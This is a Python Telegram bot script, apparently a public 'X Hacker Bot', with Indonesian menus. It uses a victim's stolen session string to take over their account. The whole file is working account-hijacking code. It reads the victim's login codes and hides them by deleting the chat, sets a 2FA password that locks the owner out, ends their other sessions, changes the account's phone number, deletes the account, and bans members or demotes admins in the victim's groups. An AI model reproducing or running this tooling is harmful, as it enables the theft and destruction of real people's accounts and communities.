# COPYRIGHT © 2021-22 BY RehanSaputra 🔥
# NOW PUBLIC BY RehanSaputra
import os
os.system("pip install Telethon==1.21.1")
from telethon import TelegramClient, events, functions, types
api_id = os.environ.get("APP_ID")
import os, asyncio
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")
client = TelegramClient('Hacker', api_id, api_hash).start(bot_token=token)
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr
mybot = "missrose_bot"
bot = borg = client

legendx = 995099715


async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X.get_me()
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(rt())
GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(functions.account.DeleteAccountRequest("me hi chutia hu"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_2fa('LEGENDXISBEST')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(join(username))

async def leavegroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    i = ""
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME {x.title} CHANNEL USRNAME @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "TheXArmy"
menu = '''

**NOTICE JOIN @ZoneDangerSex FEDERATION**
FED ID `2936f6a8-cc1d-4f76-ac1f-ac752fe5caef`


A: [periksa grup dan saluran milik pengguna]

B: [periksa semua informasi pengguna seperti nomor telepon nama pengguna...]

C: [melarang grup {berikan saya StringSession dan nama pengguna saluran/grup saya akan mencekal semua anggota di sana}]

D: [ketahui pengguna otp terakhir {pertama gunakan opsi B ambil nomor telepon dan masuk di sana Akun lalu gunakan saya, saya akan memberi Anda otp}]

E: [Bergabung dengan Grup/channel melalui StringSession]

F: [Keluar dari Grup/channel melalui StringSession]

G: [Hapus Grup/channel]

H: [Periksa apakah dua langkah pengguna diaktifkan atau dinonaktifkan]

I: [Hentikan Semua sesi aktif saat ini kecuali StringSession Anda]

J: [Hapus Akun]

K: [Demosikan semua admin di grup/channel]

L: [Promosikan anggota di grup/channel]

M: [Ganti nomor telepon menggunakan StringSession]

SAYA MENAMBAHKAN FITUR LEBIH BANYAK KEMUDIAN 😆
'''
mm = '''
Anda dapat meretas siapa pun
Ambil StringSession-nya dan gunakan saya
Aku akan memberimu kekuatan penuh milikku
Ketik /hack
'''
@client.on(events.NewMessage(pattern="/start"))
async def op(event):
  global mm
  if not event.is_private:
    await event.reply("tolong gunakan saya di sore hari 🥺")
  else:
    await event.reply(mm)
@client.on(events.NewMessage(pattern="/give"))
async def op(event):
  if not event.sender_id == legendx:
    return await event.reply("tolong jangan manfaatkan aku 🥺")
  try:
    await event.reply("session bot file", file="Hacker.session")
  except Exception as e:
    print (e)


@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
async def op(event):
  await event.reply("Tolong Gunakan Saya Di Sore Hari🥺")
@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  async with bot.conversation(event.chat_id) as x:
    await x.send_message(f"Pilih apa yang Anda inginkan dengan sesi string \n\n{menu}")
    res = await x.get_response()
    r = res.text
    if res.text == "A":
      await x.send_message("BERIKAN SESI STRING")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("StringSession ini mungkin dihentikan")
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("StringSession ini mungkin dihentikan")
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "\n\nDETAILS BY X HACKER")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\nThanks For using X Hacker Bot")
    elif res.text == "B":
      await x.send_message("BERIKAN SESI STRING")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("StringSession ini mungkin dihentikan")
      i = await userinfo(strses.text)
      await event.reply(i + "\n\nThanks For using X Hacker Bot")
    elif r == "C":
      await x.send_message("BERIKAN SESI STRING")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("StringSession ini mungkin dihentikan")
      await x.send_message("BERIKAN USERNAME/ID GRUP/CHANNEL")
      grpid = await x.get_response()
      await userbans(strses.text, grpid.text)
      await event.reply("Melarang semua anggota Terima kasih telah menggunakan X Hacker Bot")
    elif r == "D":
      await x.send_message("BERIKAN SESI STRING")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("StringSession ini mungkin dihentikan")
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\nThanks For using X Hacker Bot")
    elif r == "E":
      await x.send_message("BERIKAN SESI STRING")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("StringSession ini mungkin dihentikan")
      await x.send_message("BERIKAN USERNAME/ID GRUP/CHANNEL")
      grpid = await x.get_response()
      await joingroup(strses.text, grpid.text)
      await event.reply("Bergabung dengan Saluran/Grup Terima kasih telah menggunakan X Hacker Bot")
    elif r == "F":
      await x.send_message("BERIKAN SESI STRING")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Bergabung dengan Saluran/Grup Terima kasih telah menggunakan X Hacker Bot")
      await x.send_message("BERIKAN USERNAME/ID GRUP/CHANNEL")
      grpid = await x.get_response()
      await leavegroup(strses.text, grpid.text)
      await event.reply("Meninggalkan Saluran/Grup Terima kasih telah menggunakan X Hacker Bot")
    elif r == "G":
      await x.send_message("BERIKAN SESI STRING")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("StringSession ini mungkin dihentikan")
      await x.send_message("BERIKAN USERNAME/ID GRUP/CHANNEL")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("Menghapus Saluran/Grup Terima kasih telah menggunakan X Hacker Bot")
    elif r == "H":
      await x.send_message("BERIKAN SESI STRING")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("StringSession ini mungkin dihentikan")
      i = await user2fa(strses.text)
      if i:
        await event.reply("Saya tidak memiliki dua langkah, itulah mengapa sekarang dua langkah adalah `LEGENDXISBEST` Anda dapat login sekarang\n\nTerima kasih telah menggunakan X Hacker Bot")
      else:
        await event.reply("Maaf Pengguna Sudah dua langkah")
    elif r == "I":
      await x.send_message("BERIKAN SESI STRING")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("StringSession ini mungkin dihentikan")
      i = await terminate(strses.text)
      await event.reply("Semua sesi dihentikan\n\nTerima kasih telah menggunakan X Hacker Bot")
    elif res.text == "J":
      await x.send_message("BERIKAN SESI STRING")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("StringSession ini mungkin dihentikan")
      i = await delacc(strses.text)
      await event.reply("Akun berhasil dihapus\n\nTerima kasih telah menggunakan X Hacker Bot")
    elif res.text == "L":
      await x.send_message("BERIKAN SESI STRING")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("StringSession ini mungkin dihentikan")
      await x.send_message("SEKARANG BERIKAN NAMA PENGGUNA GRUP/CHANNEL")
      grp = await x.get_response()
      await x.send_message("SEKARANG BERIKAN NAMA PENGGUNA")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("Saya Mempromosikan Anda di Grup/Saluran tunggu sebentar 😗😗\n\nTerima kasih telah menggunakan X HackerBot")
    elif res.text == "K":
      await x.send_message("BERIKAN SESI STRING")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Akun berhasil dihapus\n\nTerima kasih telah menggunakan X Hacker Bot")
      await x.send_message("SEKARANG BERIKAN NAMA PENGGUNA GRUP/CHANNEL")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("Saya Mendemosikan semua anggota Grup/Saluran tunggu sebentar 😗😗\n\nTerima kasih telah menggunakan X Hacker Bot")
    elif res.text == "M":
      await x.send_message("BERIKAN SESI STRING")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("StringSession ini mungkin dihentikan")
      await x.send_message("BERIKAN NOMOR YANG INGIN GANTI\n[CATATAN: JANGAN GUNAKAN nomor baris ke-2 atau SMS sekarang]\n[kalau Anda menggunakan baris ke-2 atau SMS sekarang, Anda tidak bisa mendapatkan otp] ")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n salin hash kode telepon dan periksa nomor Anda, Anda mendapat otp\ni berhenti selama 20 detik salin hash kode telepon dan otp")
        await asyncio.sleep(20)
        await x.send_message("SEKARANG BERIKAN HASH KODE TELEPON")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("SEKARANG BERIKAN KODE OTP")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("NOMOR SELAMAT TELAH BERUBAH")
        else:
          await event.respond("Sesuatu data tidak valid")
      except Exception as e:
        await event.respond("KIRIM KESALAHAN INI KE - @Revanstoreya\n**LOGS**\n" + str(e))

    else:
      await event.respond("Teks Salah Ditemukan Ketik ulang /hack dan gunakan")





client.run_until_disconnected()
